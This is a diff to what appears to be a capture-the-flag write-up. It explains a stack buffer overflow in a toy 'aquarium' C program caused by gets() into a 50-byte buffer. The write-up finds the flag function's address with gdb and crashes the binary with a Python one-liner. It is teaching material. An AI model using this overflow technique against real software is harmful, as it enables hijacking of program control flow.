@@ -55,9 +55,9 @@ struct fish_tank create_aquarium() {
 	getchar();
 
 	printf("Enter the name of your fish tank: ");
-	**_char name[50];
-	gets(name);_**
 
+	char name[50]; <<< VULN
+	gets(name);    <<< VULN
 	strcpy(name, tank.name);
 	return tank;
 }
@@ -84,7 +84,7 @@ int main() {
 }
 ```
 
-In the code we can spot 2 very critical lines(marked in bold and italics) which allow us to use a `buffer overflow` attack. 
+In the code we can spot 2 very critical lines(marked with arrows) which allow us to use a `buffer overflow` attack. 
 
 So what do we want to do?
 - We want to override the `name` variable.
@@ -93,6 +93,7 @@ So what do we want to do?
 Let's begin by finding the `flag` function's address.
 
 We can open the aquarium program in gdb and use `p flag` to get the address
+
 ```
 Reading symbols from ./aquarium...
 (No debugging symbols found in ./aquarium)
@@ -100,9 +101,12 @@ Reading symbols from ./aquarium...
 $1 = {<text variable, no debug info>} **0x4011b6** <flag>
 ```
 
-Let's try giving the program about 150 characters and see how it reacts:
-$ python -c 'print ("1\n1\n10\n10\n10\n10\n" + "A" * 150)' | ./aquarium
+Let's try giving the program about 155 characters and see how it reacts:
+
+```
+$ python -c 'print ("1\n1\n10\n10\n10\n10\n" + "A" * 155)' | ./aquarium
 $ Enter the number of fish in your fish tank: Enter the size of the fish in your fish tank: Enter the amount of water in your fish tank: Enter the width of your fish tank: Enter the length of your fish tank: Enter the height of your fish tank: Enter the name of your fish tank: Segmentation fault (core dumped) 
+```
 
 Oh, the program crashed. Well, what's actually going on is that we have overridden the return address, what caused the program to return to a faulty address.
 
